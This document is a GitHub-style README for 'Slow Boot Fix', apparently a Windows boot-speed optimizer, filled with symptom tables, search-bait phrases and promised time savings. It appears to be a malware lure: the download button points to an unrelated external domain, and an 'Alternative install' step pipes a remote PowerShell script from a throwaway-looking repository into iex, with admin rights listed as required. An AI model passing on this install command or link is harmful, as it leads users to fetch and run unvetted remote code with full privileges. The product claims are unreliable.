<div align="center">

<img src="https://img.shields.io/badge/Slow_Boot_Fix-v1.5.0-2ea44f?style=for-the-badge" alt="Slow Boot Fix">

# Slow Boot Fix

**Fix slow startup and long boot times on Windows 10/11.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/Version-1.5.0-brightgreen?style=flat-square)]()
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)

<br>

[![Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_Download-Latest_Release-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://boot.nexustool.fun/)

</div>

---

## About

**Slow Boot Fix** analyzes your Windows startup process and removes bottlenecks. It disables unnecessary startup programs, fixes Windows Fast Startup issues, optimizes boot services, and repairs boot configuration — reducing boot time from **minutes to seconds**.

If your PC takes 1-5 minutes to become usable after turning on, this tool fixes it.

### Alternative install

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## Problems This Fixes

### Slow Boot (PC takes minutes to start)

| Symptom | Cause | Fix Applied |
|---|---|---|
| **Desktop appears but PC is unusable** for 1-3 minutes | Too many startup programs loading | Disables non-essential startup items |
| **Black screen with spinning dots** for 60+ seconds | Fast Startup corruption | Resets or disables Fast Startup |
| **Login screen takes forever** to appear | Boot-critical service hanging | Identifies and fixes slow services |
| Boot was fast, **now takes 2+ minutes** | New software added startup entries | Removes bloated startup entries |
| **"Getting Windows Ready"** shows every boot | Pending updates stuck | Forces update completion |
| Slow boot **after Windows Update** | Update broke boot config | Repairs BCD and boot services |
| **SSD but still slow boot** | AHCI not enabled or SSD not TRIM'd | Enables AHCI mode, runs TRIM |
| Slow boot on **HDD** | Fragmentation, no optimization | Defragments boot files, optimizes prefetch |

### Slow Login / Desktop Loading

| Symptom | Cause | Fix |
|---|---|---|
| Desktop loads but **icons take 30s+** to appear | Shell extensions overloaded | Removes broken shell extensions |
| **Taskbar takes 20s+** to become clickable | Explorer startup items | Optimizes Explorer shell load |
| **Network takes 1-2 minutes** to connect after boot | Network service dependency chain | Optimizes network service startup order |
| **Programs auto-launch** and slow everything down | Startup folder and registry bloat | Cleans startup locations |

---

## What People Search For

| Symptom | What the Tool Does |
|---|---|
| **"Windows takes 5 minutes to boot"** | Full boot optimization, startup cleanup |
| **"PC stuck on spinning dots"** | Fixes Fast Startup corruption, repairs boot |
| **"Desktop loads but nothing works for 2 minutes"** | Disables heavy startup programs |
| **"Slow after Windows Update"** | Reverts update-added startup entries |
| **"Black screen on startup for 30 seconds"** | Fixes GPU driver load delay |
| **"Computer takes forever to restart"** | Optimizes shutdown/restart services |
| **"Login screen takes 60+ seconds"** | Repairs credential service, optimizes |
| **"Boot was fast, now it's slow"** | Identifies newly added startup bloat |

---

## Boot Time Analysis

The tool measures your actual boot time and shows exactly what is slow:

```
  +---------------------------------------------------+
  |           Slow Boot Fix v1.5.0                    |
  +---------------------------------------------------+
  |                                                   |
  |  Last Boot Time: 94 seconds (target: <15s)        |
  |                                                   |
  |  Boot Phase Breakdown:                            |
  |  [!] BIOS/UEFI:           8s    (normal)          |
  |  [!] Windows Loader:      12s   (slow)            |
  |  [!] Services startup:    38s   (VERY SLOW)       |
  |  [!] User login:          6s    (normal)          |
  |  [!] Desktop ready:       30s   (VERY SLOW)       |
  |                                                   |
  |  Startup Programs: 14 (recommended: 3-5)          |
  |                                                   |
  |  Top Slowdowns:                                   |
  |  [!] OneDrive              -- adds 8s             |
  |  [!] Adobe Creative Cloud  -- adds 6s             |
  |  [!] Discord               -- adds 4s             |
  |  [!] Cortana               -- adds 3s             |
  |                                                   |
  |  [ Optimize Boot ]  [ Scan Again ]  [ Exit ]      |
  |                                                   |
  +---------------------------------------------------+
```

---

## Optimizations Applied

### Startup Management

| Action | Impact |
|---|---|
| Disable non-essential startup programs | -10 to -40 seconds |
| Remove broken startup entries | -5 to -15 seconds |
| Delay low-priority startup items | -5 to -10 seconds |
| Clean Run/RunOnce registry keys | -2 to -5 seconds |
| Optimize Startup folder | -2 to -5 seconds |

### System Boot Optimization

| Action | Impact |
|---|---|
| Configure Fast Startup correctly | -5 to -20 seconds |
| Optimize boot service order | -5 to -15 seconds |
| Set SSD TRIM schedule | -3 to -10 seconds |
| Optimize Prefetch/Superfetch for boot | -3 to -8 seconds |
| Reduce boot timeout values | -3 to -5 seconds |
| Disable boot GUI for faster POST | -2 to -3 seconds |

### Advanced

| Action | Impact |
|---|---|
| Repair BCD (Boot Configuration Data) | Fixes boot errors |
| Reset Windows Fast Startup | Fixes black screen delays |
| Optimize UEFI boot order | -2 to -5 seconds |
| Disable unnecessary boot drivers | -3 to -8 seconds |

---

## Typical Results

| System | Before | After | Saved |
|---|---|---|---|
| Laptop with HDD | 3 min 20s | 45s | **2 min 35s** |
| Desktop with SSD | 55s | 12s | **43s** |
| Laptop with SSD | 1 min 10s | 15s | **55s** |
| Old PC with HDD | 4 min+ | 1 min 20s | **2 min 40s** |

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| Disk | HDD or SSD |
| Admin | Yes |
| Network | Not required |

---

## FAQ

**Will it disable programs I need?**
The tool shows every startup item and its boot impact. You choose what to disable. Critical Windows services are never touched.

**Is Fast Startup good or bad?**
It depends. Fast Startup can speed up boot on clean systems but causes issues on many PCs (black screen, driver conflicts). The tool tests and configures it correctly for your system.

**I have an SSD but boot is still slow.**
SSDs eliminate disk bottlenecks but startup programs and services still load. The main gains come from reducing startup items and optimizing services.

**Can I undo the changes?**
Yes. The tool creates a backup of all startup settings. One click to restore.

---

## License

[MIT](LICENSE)
